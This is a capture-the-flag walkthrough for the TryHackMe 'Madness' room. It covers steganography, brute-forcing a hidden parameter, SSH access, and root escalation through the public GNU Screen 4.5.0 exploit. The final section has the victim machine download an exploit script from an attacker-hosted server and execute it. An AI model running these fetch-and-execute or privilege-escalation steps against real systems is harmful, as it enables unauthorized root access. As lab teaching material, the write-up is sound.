# [Madness](https://tryhackme.com/room/madness)

## Will you be consumed by Madness?

# Flag Submission

### user.txt

_There's something ROTten about this guys name!_

1. Enumerate services with `nmap` to identify open ports and running services

```bash
nmap IP
```

[SCREEN01]

2. Exploring the web server, examine the source code of the main page at `http://IP/`. There we find some interesting comments and a reference to `thm.jpg`. Download the image for further examination

```bash
wget http://IP/thm.jpg
```

[SCREEN02]

3. The downloaded image appears broken and won't display properly. Examine the file header to identify the issue
   - The file has PNG magic numbers but a JPG extension, causing the display issue

```bash
xxd -l 24 thm.jpg
```

[SCREEN03]

4. Fix the file by changing the magic numbers from PNG format to JPG format using a hex editor

```bash
hexedit thm.jpg
```

[SCREEN04]

5. After fixing the image, opening it reveals a hidden directory path: **/th1s_1s_h1dd3n**

[SCREEN05]

6. Navigating to `http://IP/th1s_1s_h1dd3n/` shows a page with a secret input. In the page source, we find a comment mentioning that the secret value is a number between 0 and 99

[SCREEN06]

7. The secret can be submitted via the `secret` parameter by adding `?secret=` to the URL. We can use Burp Suite's Intruder feature to brute force values from 0 to 99

[SCREEN07]

8. In the Intruder attack results, examine the response length to identify the correct secret value
   - After submitting the correct secret value (73), we receive a string: **y2RPJ4QaPF!B**

[SCREEN08]

9. Return to the fixed `thm.jpg` image and use steghide to extract hidden data using **y2RPJ4QaPF!B** as the password

```bash
steghide extract -sf thm.jpg
```

[SCREEN09]

10. The hint mentioned something "ROTten" - this suggests ROT13 encoding. Decode the username using ROT13 in [CyberChef](https://gchq.github.io/CyberChef/) to get the actual username: **joker**

[SCREEN10]

11. For the password, we need to examine another image linked in the room description: `https://i.imgur.com/5iW7kC8.jpeg`. Download and extract hidden content with `steghide` without requiring a password

```bash
steghide extract -sf 5iW7kC8.jpg
```

[SCREEN11]

12. Now with both username and password, connect via SSH and retrieve the user flag

```bash
ssh joker@IP
cat user.txt
```

[SCREEN12]

---

### root.txt

1. Check for files with SUID permissions to identify potential privilege escalation vectors
   - The results show several binaries with SUID bit set, and `/bin/screen` looks particularly interesting as it's not commonly set with SUID permissions

```bash
find / -perm -u=s -type f 2>/dev/null
```

[SCREEN13]

3. Research reveals that GNU Screen 4.5.0 has a known local privilege escalation vulnerability (CVE-2017-5618). Download the exploit from [Exploit-DB](https://www.exploit-db.com/exploits/41154) to your attacker machine and transfer it to the victim's `/tmp` directory

```bash
# On attacker machine
python3 -m http.server
```

```bash
# On victim machine
cd /tmp/
wget http://IP:8000/41154.sh
chmod +x 41154.sh
./41154.sh
whoami
cat /root/root.txt
```

[SCREEN14]
